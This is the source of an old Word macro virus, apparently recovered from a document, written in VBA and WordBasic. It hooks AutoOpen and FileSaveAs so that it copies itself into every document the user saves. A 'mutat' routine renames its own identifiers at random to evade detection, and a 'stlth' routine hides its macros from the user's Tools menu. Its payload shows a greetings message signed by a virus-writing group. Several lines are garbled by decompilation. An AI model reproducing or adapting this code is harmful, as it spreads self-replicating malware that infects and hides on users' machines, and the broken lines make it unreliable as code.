   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   WordBasic.LineDown 1
   WordBasic.EndOfDocument 1

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Dim FlNm$
   Dim FlMcr$
   Dim fldg_ As Object: Set fldg_ = WordBasic.DialogRecord.FileSaveAs(False)
   Set fldg_ = WordBasic.CurValues.FileSaveAs
   WordBasic.Dialog.FileSaveAs fldg_
   If fldg_.Format = 0 Then fldg_.Format = 1
   FlNm$ = WordBasic.[FileName$]()
   FlMcr$ = FlNm$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:XXXXX", FlMcr$
   WordBasic.FileSaveAs fldg_
   End Sub

   Attribute VB_Name = "XXXXX"

   Public Sub MAIN()
   Dim ExtrasENLFC
   Dim JYEPL
   On Error Resume Next
   ExtrasENLFC JYEPL = "autoopen", "MTNTMgen" = 1, Delete
   ExtrasENLFC JYEPL = "FileSaveAs", "MTNTMgen" = 1, Delete
   ExtrasENLFC JYEPL = "XXXXX", "MTNTMgen" = 1, Delete
   WordBasic.AppMinimize
   ExtrasENLFC JYEPL = "autoopen", Edit, "MTNTMgen" = 3
   WordBasic.StartOfDocument
   WordBasic.EndOfDocument 1
   WordBasic.EditCopy
   WordBasic.DocClose
   ExtrasENLFC JYEPL = "XXXXX", "MTNTMgen" = 1, Edit
   WordBasic.StartOfDocument
   WordBasic.EndOfDocument 1
   WordBasic.EditPaste
   WordBasic.DocClose 1
   ExtrasENLFC JYEPL = "XXXXX", Edit, "MTNTMgen" = 1
   WordBasic.StartOfDocument
   WordBasic.LineDown 35
   WordBasic.LineDown 9, 1
   WordBasic.EditCopy
   WordBasic.DocClose
   ExtrasENLFC JYEPL = "FileSaveAs", Edit, "MTNTMgen" = 1
   WordBasic.StartOfDocument
   WordBasic.LineDown 1
   WordBasic.EndOfDocument 1
   WordBasic.EditPaste
   WordBasic.DocClose 1
   mutat
   Payld
   stlth
   WordBasic.AppRestore
   End Sub

   Private Sub FlSvA()
   Dim KMGSWFormatOTBBYThen_
   Dim KMGSWFormat_
   Dim FlNm$
   Dim FlMcr$
   Dim ENLFCKopieren
   Dim fldg_ As Object: Set fldg_ = WordBasic.DialogRecord.FileSaveAs(False)
   Set fldg_ = WordBasic.CurValues.FileSaveAs
   WordBasic.Dialog.FileSaveAs fldg_
   If KMGSWFormatOTBBYThen_ KMGSWFormat_ = 1
   FlNm$ = WordBasic.[FileName$]()
   FlMcr$ = FlNm$ + ":AutoOpen"
   ENLFCKopieren "Global:XXXXX", FlMcr$
   WordBasic.FileSaveAs fldg_
   End If
   End Sub

   Private Function Rndnm$()
   Dim count_
   Dim rndnx
   Dim rndnx_$
   For count_ = 1 To 5
      rndnx = WordBasic.Int(Rnd() * (90 - 65) + 65)
      rndnx_$ = rndnx_$ + Chr(rndnx)
   Next count_
   Rndnm$ = rndnx_$
   End Function

   Private Sub Payld()
   Dim Rndnm_
   Rndnm_ = WordBasic.Int(Rnd() * (51 - 1) + 1)
   If Rndnm_ = 50 Then WordBasic.MsgBox "Greetings to: SSWLTDragon, SSWLTMonk, SSWLTBard, SSWLTSage, SSWLTTeck, SSWLTHawk, SSWLTBeef, SSWLTLich, SSWLTKnight.  From: SSWLTPhantom"
   End Sub

   Private Sub mutat()
   Dim ExtrasENLFC
   Dim JYEPL
   Dim dnatx$
   ExtrasENLFC JYEPL = "XXXXX", Edit, "MTNTMgen" = 1
   WordBasic.StartOfDocument
   dnatx$ = WordBasic.[GetText$](606, 611) 'mutat
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](648, 653) 'FlSvA
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](658, 663) '_fldg
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](612, 617) 'Payld
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](869, 874) 'Rndnm
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](880, 885) 'count
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   dnatx$ = WordBasic.[GetText$](1299, 1304) 'dnatx
   WordBasic.EditReplace Find:=dnatx$, Replace:=Rndnm$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=1, FindAllWordForms:=0
   WordBasic.DocClose 1
   End Sub

   Private Sub stlth()
   Dim ExtrasENLFC
   Dim JYEPL
   ExtrasENLFC JYEPL = "XXXXX", Edit, "MTNTMgen" = 1
   WordBasic.StartOfDocument
   WordBasic.LineDown 123
   WordBasic.LineDown 2, 1
   WordBasic.EditCopy
   WordBasic.DocClose
   ExtrasENLFC JYEPL = "ToolsMacro", Edit, "MTNTMgen" = 1
   WordBasic.StartOfDocument
   WordBasic.LineDown 1
   WordBasic.EndOfDocument 1
   WordBasic.EditPaste
   WordBasic.DocClose 1

   ExtrasENLFC JYEPL = "XXXXX", Edit, "MTNTMgen" = 1
   WordBasic.StartOfDocument
   WordBasic.LineDown 127
   WordBasic.LineDown 2, 1
   WordBasic.EditCopy
   WordBasic.DocClose
   ExtrasENLFC JYEPL = "FileTemplates", Edit, "MTNTMgen" = 1
   WordBasic.StartOfDocument
   WordBasic.LineDown 1
   WordBasic.EndOfDocument 1
   WordBasic.EditPaste
   WordBasic.DocClose 1
   End Sub

   Private Sub TlsMc()
   'No Macro
   End Sub

   Private Sub FlTpt()
   'No Macro
   End Sub
